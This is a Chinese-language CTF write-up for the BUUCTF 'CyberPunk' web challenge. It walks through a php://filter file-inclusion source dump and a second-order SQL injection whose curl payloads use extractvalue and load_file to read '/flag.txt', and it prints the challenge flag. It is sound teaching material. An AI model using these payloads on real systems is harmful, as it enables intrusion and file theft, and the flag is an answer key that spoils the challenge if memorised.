---
title: "[CISCN2019 华北赛区 Day1 Web5]CyberPunk"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [sql-injection, second-order-injection, error-based-injection, file-read]
vulnerability: 二次SQL注入 + 报错注入读取文件
solved: true
flag: "flag{f63f29d4-b389-4539-a9b3-2ed4e0f9a955}"
---

# [CISCN2019 华北赛区 Day1 Web5]CyberPunk

## 题目概述
一个订单管理系统，包含提交订单、查询订单、修改地址、删除订单功能。页面注释提示 `<!--?file=?-->`，暗示文件包含漏洞。

## 信息收集

### 1. 文件包含漏洞
首页存在 `?file=` 参数，可用 php://filter 读取源码：
```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

### 2. 源码分析

**index.php** - 文件包含入口：
```php
ini_set('open_basedir', '/var/www/html/');
$file = $_GET['file'];
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
```

**confirm.php** - 提交订单：
```php
$pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
$user_name = $_POST["user_name"];
$address = $_POST["address"];  // 注意：address 没有过滤！
$phone = $_POST["phone"];
```

**change.php** - 修改地址（漏洞点）：
```php
$address = addslashes($_POST["address"]);  // 新地址被转义
$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
// $row['address'] 是旧地址，直接拼接！
```

## 漏洞分析

### 漏洞类型：二次SQL注入

**判断过程：**
1. `confirm.php` 中 `address` 字段没有经过正则过滤，直接插入数据库
2. `change.php` 中旧的 `address` 值从数据库取出后直接拼接到 SQL 语句
3. 形成二次注入：先插入恶意数据 → 修改时触发注入

## 利用过程

### Step 1: 提交恶意订单
```bash
curl -X POST "http://target/confirm.php" \
  --data-urlencode "user_name=attacker" \
  --data-urlencode "phone=123456" \
  --data-urlencode "address=' where 1=1 and extractvalue(1,concat(0x7e,substring((select load_file('/flag.txt')),1,30),0x7e))#"
```

### Step 2: 触发二次注入
```bash
curl -X POST "http://target/change.php" \
  --data-urlencode "user_name=attacker" \
  --data-urlencode "phone=123456" \
  --data-urlencode "address=anything"
```

### Step 3: 获取 Flag（分段读取）
```bash
# 第一部分：flag{f63f29d4-b389-4539-a9b3-2
# 第二部分：ed4e0f9a955}
```

**完整 Flag：** `flag{f63f29d4-b389-4539-a9b3-2ed4e0f9a955}`

## 技术总结

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 二次SQL注入 | address字段 | `' where 1=1 and extractvalue(...)` | 数据先存后取，绕过过滤 |
| 报错注入 | UPDATE语句 | extractvalue(1,concat(0x7e,...)) | 利用XPATH报错回显数据 |
| 文件读取 | load_file函数 | load_file('/flag.txt') | MySQL读取服务器文件 |

## 知识总结

### 二次注入特点
1. **存储阶段安全**：数据被安全存入数据库（预处理）
2. **使用阶段危险**：从数据库取出的数据被信任，直接拼接
3. **绕过WAF**：恶意数据在存储时不触发过滤规则

### 报错注入函数
- `extractvalue(1,concat(0x7e,(select ...)))` - XPATH语法错误
- 报错信息最多显示32个字符，需分段读取
